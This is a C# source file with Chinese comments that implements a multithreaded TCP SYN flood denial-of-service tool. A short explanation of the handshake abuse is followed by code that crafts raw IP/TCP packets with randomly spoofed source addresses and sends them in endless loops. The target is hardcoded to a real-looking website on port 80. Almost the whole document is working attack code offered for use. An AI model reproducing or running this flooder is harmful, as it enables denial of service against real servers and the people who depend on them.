//win98 winme无效，winxpsp2估计也不行 sp1就可 2000 2003完全可以  
//＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝  
//tcp协议是3次握手的方式连接的，第一次客户机向服务器发送一个标志为syn的数据包，这个数据包的tcp部分有个16位随即序列号，而且ip部分和tcp部分各有一个校验码，发送出去只有校验码正确才会视为合法的数据包，然后如果那个机器那个端口有服务器，比如http服务，就会把序列号+1，然后再生成一个16位随机序列号，标志syn+ack的数据包返回，服务器就会占着一个信道等待第三次握手了，如果超过预定时间等不到就超时去掉了，这时如果开始那个syn的源ip地址和源端口是伪造的并大量发送，服务器就会大量的向假ip端口返回syn+ack并等待，这样就大量占着信道了，如果超过了连接限制，别的机器就连不上了，就拒绝服务了。原理大体就是这个样子了。下面就是代码。  

//==================================================================================  

//太上老君  
//http://www.laotzu.be  
//必须在项目属性里把允许不安全代码设为true才可编译  
using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
//需要的命名空间不用解释了吧  
namespace syn
{
	public struct ipHeader
	{
		public byte ip_verlen; //4位首部长度+4位IP版本号  
		public byte ip_tos; //8位服务类型TOS  
		public ushort ip_totallength; //16位数据包总长度（字节）  
		public ushort ip_id; //16位标识  
		public ushort ip_offset; //3位标志位  
		public byte ip_ttl; //8位生存时间 TTL  
		public byte ip_protocol; //8位协议(TCP, UDP, ICMP, Etc.)  
		public ushort ip_checksum; //16位IP首部校验和  
		public uint ip_srcaddr; //32位源IP地址  
		public uint ip_destaddr; //32位目的IP地址  
	}
	public struct psdHeader
	{
		public uint saddr;   //源地址  
		public uint daddr;   //目的地址  
		public byte mbz;
		public byte ptcl;      //协议类型  
		public ushort tcpl;   //TCP长度  
	}
	public struct tcpHeader
	{
		public ushort th_sport;     //16位源端口  
		public ushort th_dport;     //16位目的端口  
		public int th_seq;    //32位序列号  
		public uint th_ack;    //32位确认号  
		public byte th_lenres;   //4位首部长度/6位保留字  
		public byte th_flag;    //6位标志位  
		public ushort th_win;      //16位窗口大小  
		public ushort th_sum;      //16位校验和  
		public ushort th_urp;      //16位紧急数据偏移量  
	}
	//这3个是ip首部tcp伪首部tcp首部的定义。  
	public class syn
	{
		private uint ip;
		private ushort port;
		private EndPoint ep;
		private Random rand;
		private Socket sock;
		private ipHeader iph;
		private psdHeader psh;
		private tcpHeader tch;
		public UInt16 checksum(UInt16[] buffer, int size)
		{
			Int32 cksum = 0;
			int counter;
			counter = 0;

			while (size > 0)
			{
				UInt16 val = buffer[counter];

				cksum += Convert.ToInt32(buffer[counter]);
				counter += 1;
				size -= 1;
			}

			cksum = (cksum >> 16) + (cksum & 0xffff);
			cksum += (cksum >> 16);
			return (UInt16)(~cksum);
		}

		public static double RequestNumber = 0;

		static object locker = new object();

		//这个使用来计算校验码的我照抄c#实现ping那文章的方法，反正ip协议计算校验码方法都一样  
		public syn(uint _ip, ushort _port, EndPoint _ep, Random _rand)
		{
			ip = _ip;
			port = _port;
			ep = _ep;
			rand = _rand;
			ipHeader iph = new ipHeader();
			psh = new psdHeader();
			tch = new tcpHeader();
			sock = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);
			sock.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, 1);
			//这2个挺重要，必须这样才可以自己提供ip头  
		}
		//传参数的多线程需要用到代构造函数的对象。  
		static void Main(string[] args)
		{
			string url = "www.biyao.com";
			string p = "80";
			string tNum = "5";

			Console.WriteLine("1. input target ip or address");
			try
			{
				IPHostEntry pe = Dns.GetHostByName(url);
				uint ip = Convert.ToUInt32(pe.AddressList[0].Address);//这是要攻击的ip并转为网络字节序  
				Console.WriteLine("2. input target port");
				ushort port = ushort.Parse(p);
				IPEndPoint ep = new IPEndPoint(pe.AddressList[0], port);
				byte[] bt = BitConverter.GetBytes(port);
				Array.Reverse(bt);
				port = BitConverter.ToUInt16(bt, 0);
				//要攻击的端口也得转为网络字节序，必须是16位0－65535，如果用hosttonetworkorder就转成32位的了，无奈这样  
				Console.WriteLine("3. input attack thread number(max: 50)");
				int xiancheng = Int32.Parse(tNum);
				if (xiancheng < 1 || xiancheng > 50)
				{
					Console.WriteLine("thread number should between 1~50");
					return;
				}
				Random rand = new Random();
				Thread[] t = new Thread[xiancheng];
				syn[] sy = new syn[xiancheng];
				for (int i = 0; i < xiancheng; i++)
				{
					sy[i] = new syn(ip, port, ep, rand);
					t[i] = new Thread(new ThreadStart(sy[i].synFS));
					t[i].Start();
				}
				//一个线程对应一个对象，不知多个线程对应同一个对象行不行，请指点。基础不行啊  
			}
			catch
			{
				Console.WriteLine("error! check whether you can connect the internet or input right");
				return;
			}


		}
		unsafe public void synFS()
		{
			iph.ip_verlen = (byte)(4 << 4 | sizeof(ipHeader) / sizeof(uint));
			//ipv4，20字节ip头，这个固定就是69  
			iph.ip_tos = 0;
			//这个0就行了  
			iph.ip_totallength = 0x2800;
			//这个是ip头+tcp头总长，40是最小长度，不带tcp option，应该是0028但是还是网络字节序所以倒过来成了2800  
			iph.ip_id = 0x9B18;
			//这个我是拦截ie发送。直接添上来了  
			iph.ip_offset = 0x40;
			//这个也是拦截ie的  
			iph.ip_ttl = 64;
			//也是拦截ie的，也可以是128什么的。  
			iph.ip_protocol = 6;
			//6就是tcp协议  
			iph.ip_checksum = UInt16.Parse("0");
			//没计算之前都写0  
			iph.ip_destaddr = ip;
			//ip头的目标地址就是要攻击的地址，上面传过来的。  
			psh.daddr = iph.ip_destaddr;
			//伪tcp首部用于校验的，上面是目的地址，和ip的那个一样。  
			psh.mbz = 0;
			//这个据说0就行  
			psh.ptcl = 6;
			//6是tcp协议  
			psh.tcpl = 0x1400;
			//tcp首部的大小，20字节，应该是0014，还是字节序原因成了1400  
			tch.th_dport = port;
			//攻击端口号，上面传过来的  
			tch.th_ack = 0;
			//第一次发送所以没有服务器返回的序列号，为0  
			tch.th_lenres = (byte)((sizeof(tcpHeader) / 4 << 4 | 0));
			//tcp长度  
			tch.th_flag = 2;
			//2就是syn  
			tch.th_win = ushort.Parse("16614");
			//拦截ie的  
			tch.th_sum = UInt16.Parse("0");
			//没计算之前都为0  
			tch.th_urp = UInt16.Parse("0");
			//这个连ip都是0，新的攻击方法有改这个值的  
			while (true)
			{
				iph.ip_srcaddr = Convert.ToUInt32(IPAddress.Parse(rand.Next(1, 255) + "." + rand.Next(1, 255) + "." + rand.Next(1, 255) + "." + rand.Next(1, 255)).Address);
				psh.saddr = iph.ip_srcaddr;
				ushort duankou = Convert.ToUInt16(rand.Next(1, 65535));
				byte[] bt = BitConverter.GetBytes(duankou);
				Array.Reverse(bt);
				tch.th_sport = BitConverter.ToUInt16(bt, 0);
				tch.th_seq = IPAddress.HostToNetworkOrder((int)rand.Next(-2147483646, 2147483646));
				//上面用随机种子随机产生源ip源端口和tcp序列号并转为网络字节序  

				iph.ip_checksum = 0;
				tch.th_sum = 0;
				//因为循环中，所以每次必须把这2个已有数的清0才可计算  
				byte[] psh_buf = new byte[sizeof(psdHeader)];
				Int32 index = 0;
				index = pshto(psh, psh_buf, sizeof(psdHeader));
				if (index == -1)
				{
					Console.WriteLine("构造tcp伪首部错误");
					return;
				}
				index = 0;
				byte[] tch_buf = new byte[sizeof(tcpHeader)];
				index = tchto(tch, tch_buf, sizeof(tcpHeader));
				if (index == -1)
				{
					Console.WriteLine("构造tcp首部错误1");
					return;
				}
				index = 0;
				byte[] tcphe = new byte[sizeof(psdHeader) + sizeof(tcpHeader)];
				Array.Copy(psh_buf, 0, tcphe, index, psh_buf.Length);
				index += psh_buf.Length;
				Array.Copy(tch_buf, 0, tcphe, index, tch_buf.Length);
				index += tch_buf.Length;
				tch.th_sum = chec(tcphe, index);
				index = 0;
				index = tchto(tch, tch_buf, sizeof(tcpHeader));
				if (index == -1)
				{
					Console.WriteLine("构造tcp首部错误2");
					return;
				}
				index = 0;
				byte[] ip_buf = new byte[sizeof(ipHeader)];
				index = ipto(iph, ip_buf, sizeof(ipHeader));
				if (index == -1)
				{
					Console.WriteLine("构造ip首部错误1");
					return;
				}
				index = 0;
				byte[] iptcp = new byte[sizeof(ipHeader) + sizeof(tcpHeader)];
				Array.Copy(ip_buf, 0, iptcp, index, ip_buf.Length);
				index += ip_buf.Length;
				Array.Copy(tch_buf, 0, iptcp, index, tch_buf.Length);
				index += tch_buf.Length;
				iph.ip_checksum = chec(iptcp, index);
				index = 0;
				index = ipto(iph, ip_buf, sizeof(tcpHeader));
				if (index == -1)
				{
					Console.WriteLine("构造ip首部错误2");
					return;
				}
				index = 0;
				Array.Copy(ip_buf, 0, iptcp, index, ip_buf.Length);
				index += ip_buf.Length;
				Array.Copy(tch_buf, 0, iptcp, index, tch_buf.Length);
				index += tch_buf.Length;
				if (iptcp.Length != (sizeof(ipHeader) + sizeof(tcpHeader)))
				{
					Console.WriteLine("构造iptcp报文错误");
					return;
				}
				//上面这一大堆东西就是计算校验和的方法了，方法是  
				//1、建立一个字节数组，前面放tcp伪首部后面放tcp首部，然后计算，确定最终tcp部分的校验和  
				//2、把确定了校验和地tcp首部重新生成字节数组，这是就不加tcp伪首部了，所以工20字节  
				//3、建40字节字节数组，前面放ip首部，后面放tcp首部，校验，确定最终ip部分校验和  
				//4、最后把确定了ip校验和的ip部分和tcp部分先后放入40字节的字节数组中，就是要发送的buffer[]了，就是这么麻烦  
				try
				{

					sock.SendTo(iptcp, ep);
					//构造发送字节数组总是麻烦，发送就简单了，socket.sendto就可以了  
					Console.WriteLine("send {0} requests", ++RequestNumber);
				}
				catch
				{
					Console.WriteLine("发送错误");
					return;
				}


			}

		}
		public UInt16 chec(byte[] buffer, int size)
		{
			Double double_length = Convert.ToDouble(size);
			Double dtemp = Math.Ceiling(double_length / 2);
			int cksum_buffer_length = Convert.ToInt32(dtemp);
			UInt16[] cksum_buffer = new UInt16[cksum_buffer_length];
			int icmp_header_buffer_index = 0;
			for (int i = 0; i < cksum_buffer_length; i++)
			{
				cksum_buffer[i] =
				 BitConverter.ToUInt16(buffer, icmp_header_buffer_index);
				icmp_header_buffer_index += 2;
			}
			UInt16 u_cksum = checksum(cksum_buffer, cksum_buffer_length);
			return u_cksum;
		}
		//这个是计算校验，把那些类型不一样的全转为16位字节数组用的  
		public Int32 ipto(ipHeader iph, byte[] Buffer, int size)
		{
			Int32 rtn = 0;
			int index = 0;
			byte[] b_verlen = new byte[1];
			b_verlen[0] = iph.ip_verlen;
			byte[] b_tos = new byte[1];
			b_tos[0] = iph.ip_tos;
			byte[] b_totallen = BitConverter.GetBytes(iph.ip_totallength);
			byte[] b_id = BitConverter.GetBytes(iph.ip_id);
			byte[] b_offset = BitConverter.GetBytes(iph.ip_offset);
			byte[] b_ttl = new byte[1];
			b_ttl[0] = iph.ip_ttl;
			byte[] b_protol = new byte[1];
			b_protol[0] = iph.ip_protocol;
			byte[] b_checksum = BitConverter.GetBytes(iph.ip_checksum);
			byte[] b_srcaddr = BitConverter.GetBytes(iph.ip_srcaddr);
			byte[] b_destaddr = BitConverter.GetBytes(iph.ip_destaddr);
			Array.Copy(b_verlen, 0, Buffer, index, b_verlen.Length);
			index += b_verlen.Length;
			Array.Copy(b_tos, 0, Buffer, index, b_tos.Length);
			index += b_tos.Length;
			Array.Copy(b_totallen, 0, Buffer, index, b_totallen.Length);
			index += b_totallen.Length;
			Array.Copy(b_id, 0, Buffer, index, b_id.Length);
			index += b_id.Length;
			Array.Copy(b_offset, 0, Buffer, index, b_offset.Length);
			index += b_offset.Length;
			Array.Copy(b_ttl, 0, Buffer, index, b_ttl.Length);
			index += b_ttl.Length;
			Array.Copy(b_protol, 0, Buffer, index, b_protol.Length);
			index += b_protol.Length;
			Array.Copy(b_checksum, 0, Buffer, index, b_checksum.Length);
			index += b_checksum.Length;
			Array.Copy(b_srcaddr, 0, Buffer, index, b_srcaddr.Length);
			index += b_srcaddr.Length;
			Array.Copy(b_destaddr, 0, Buffer, index, b_destaddr.Length);
			index += b_destaddr.Length;
			if (index != size/* sizeof(IcmpPacket)   */)
			{
				rtn = -1;
				return rtn;
			}

			rtn = index;
			return rtn;

		}
		//这个是把ip部分转为字节数组用的  
		public Int32 pshto(psdHeader psh, byte[] buffer, int size)
		{
			Int32 rtn;
			int index = 0;
			byte[] b_psh_saddr = BitConverter.GetBytes(psh.saddr);
			byte[] b_psh_daddr = BitConverter.GetBytes(psh.daddr);
			byte[] b_psh_mbz = new byte[1];
			b_psh_mbz[0] = psh.mbz;
			byte[] b_psh_ptcl = new byte[1];
			b_psh_ptcl[0] = psh.ptcl;
			byte[] b_psh_tcpl = BitConverter.GetBytes(psh.tcpl);
			Array.Copy(b_psh_saddr, 0, buffer, index, b_psh_saddr.Length);
			index += b_psh_saddr.Length;
			Array.Copy(b_psh_daddr, 0, buffer, index, b_psh_daddr.Length);
			index += b_psh_daddr.Length;
			Array.Copy(b_psh_mbz, 0, buffer, index, b_psh_mbz.Length);
			index += b_psh_mbz.Length;
			Array.Copy(b_psh_ptcl, 0, buffer, index, b_psh_ptcl.Length);
			index += b_psh_ptcl.Length;
			Array.Copy(b_psh_tcpl, 0, buffer, index, b_psh_tcpl.Length);
			index += b_psh_tcpl.Length;
			if (index != size)
			{
				rtn = -1;
				return rtn;
			}
			else
			{
				rtn = index;
				return rtn;
			}

		}
		//这个是把tcp伪首部转为字节数组用的  
		public Int32 tchto(tcpHeader tch, byte[] buffer, int size)
		{
			Int32 rtn;
			int index = 0;
			byte[] b_tch_sport = BitConverter.GetBytes(tch.th_sport);
			byte[] b_tch_dport = BitConverter.GetBytes(tch.th_dport);
			byte[] b_tch_seq = BitConverter.GetBytes(tch.th_seq);
			byte[] b_tch_ack = BitConverter.GetBytes(tch.th_ack);
			byte[] b_tch_lenres = new byte[1];
			b_tch_lenres[0] = tch.th_lenres;
			byte[] b_tch_flag = new byte[1];
			b_tch_flag[0] = tch.th_flag;
			byte[] b_tch_win = BitConverter.GetBytes(tch.th_win);
			byte[] b_tch_sum = BitConverter.GetBytes(tch.th_sum);
			byte[] b_tch_urp = BitConverter.GetBytes(tch.th_urp);
			Array.Copy(b_tch_sport, 0, buffer, index, b_tch_sport.Length);
			index += b_tch_sport.Length;
			Array.Copy(b_tch_dport, 0, buffer, index, b_tch_dport.Length);
			index += b_tch_dport.Length;
			Array.Copy(b_tch_seq, 0, buffer, index, b_tch_seq.Length);
			index += b_tch_seq.Length;
			Array.Copy(b_tch_ack, 0, buffer, index, b_tch_ack.Length);
			index += b_tch_ack.Length;
			Array.Copy(b_tch_lenres, 0, buffer, index, b_tch_lenres.Length);
			index += b_tch_lenres.Length;
			Array.Copy(b_tch_flag, 0, buffer, index, b_tch_flag.Length);
			index += b_tch_flag.Length;
			Array.Copy(b_tch_win, 0, buffer, index, b_tch_win.Length);
			index += b_tch_win.Length;
			Array.Copy(b_tch_sum, 0, buffer, index, b_tch_sum.Length);
			index += b_tch_sum.Length;
			Array.Copy(b_tch_urp, 0, buffer, index, b_tch_urp.Length);
			index += b_tch_urp.Length;
			if (index != size)
			{
				rtn = -1;
				return rtn;
			}
			else
			{
				rtn = index;
				return rtn;
			}
		}
		//这个是把tcp部分转为字节数组用的，因为这个要用到2次就不把这个和伪首部放一块了。  
	}
}
//最后，本代码校验部分的方法参考了用c#实现ping程序的文章